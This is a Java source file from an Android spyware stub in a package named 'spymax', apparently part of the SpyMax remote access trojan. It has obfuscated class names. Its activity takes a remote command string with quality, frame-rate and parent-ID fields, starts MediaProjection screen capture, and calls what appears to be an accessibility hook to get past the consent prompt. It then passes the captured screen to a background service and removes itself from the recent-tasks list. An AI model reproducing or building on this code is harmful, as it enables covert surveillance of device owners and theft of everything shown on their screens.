package spymax.stub7;


import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;

import static spymax.stub7._cap_sc_.ACTION_SHUTDOWN;

public class SCRActivity extends Activity {

    private static final int REQUEST_SCREENSHOT=59706;
    private MediaProjectionManager mgr;

    private int Qualti = 10;
    private int F = 10;
    private String Perantid ;
    @Override
    public void finish() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            super.finishAndRemoveTask();
        } else {
            super.finish();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();

    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);


        try {
            Intent intent = getIntent();
            String value = null ;
            try {
                value = intent.getStringExtra("key");
            }catch (Exception e){}

            if (value == null)
            {
                value = "off";
            }

            if (value.startsWith("on:"))
            {

                if(staticIntentData == null) {
                    ClassGen12.ClassGen12FOR_SC = true;
                    value = value.replace("on:", "");
                    String[] inf = value.split("~");
                    Qualti = Integer.parseInt(inf[0]);
                    F = Integer.parseInt(inf[1]);
                    Perantid = inf[2];

                    mgr = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);

                    startActivityForResult(mgr.createScreenCaptureIntent(),
                            REQUEST_SCREENSHOT);

                    try
                    {
                        if (ClassGen11.MyAccess != null)
                        {
                            ClassGen11.MyAccess.ClassGen12Treger();
                        }
                    }catch (Exception a){}


                } else {
                    try
                    {
                        ClassGen12.ClassGen12FOR_SC = false;
                        value = value.replace("on:", "");
                        String[] inf = value.split("~");
                        Qualti = Integer.parseInt(inf[0]);
                        F = Integer.parseInt(inf[1]);
                        Intent i=
                                new Intent(this, _cap_sc_.class)
                                        .putExtra(_cap_sc_.EXTRA_RESULT_CODE, staticResultCode)
                                        .putExtra(_cap_sc_.EXTRA_RESULT_INTENT, staticIntentData)
                                        .putExtra("Q",Qualti)
                                        .putExtra("P",Perantid)
                                        .putExtra("F",F);

                        startService(i);
                    }catch (Exception e){
                        ClassGen12.ClassGen12FOR_SC = true;
                        value = value.replace("on:", "");
                        String[] inf = value.split("~");
                        Qualti = Integer.parseInt(inf[0]);
                        F = Integer.parseInt(inf[1]);

                        mgr = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);

                        startActivityForResult(mgr.createScreenCaptureIntent(),
                                REQUEST_SCREENSHOT);

                        try
                        {
                            if (ClassGen11.MyAccess != null)
                            {
                                ClassGen11.MyAccess.ClassGen12Treger();
                            }
                        }catch (Exception a){}
                    }

                    finish();
                }

            }else
            {
                Intent i=
                        new Intent(this, _cap_sc_.class)
                                .setAction(ACTION_SHUTDOWN);


                startService(i);
                finish();
            }
        }catch (Exception e){
            finish();
        }

    }
    private static Intent staticIntentData;
    private static int staticResultCode;

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode==REQUEST_SCREENSHOT) {
            if (resultCode==RESULT_OK) {
                ClassGen12.ClassGen12FOR_SC = false;
                staticIntentData =data;
                staticResultCode =resultCode;
                Intent i=
                        new Intent(this, _cap_sc_.class)
                                .putExtra(_cap_sc_.EXTRA_RESULT_CODE, resultCode)
                                .putExtra(_cap_sc_.EXTRA_RESULT_INTENT, data)
                                .putExtra("Q",Qualti)
                                .putExtra("P",Perantid)
                                .putExtra("F",F);

                startService(i);
            }
        }

        finish();
    }
}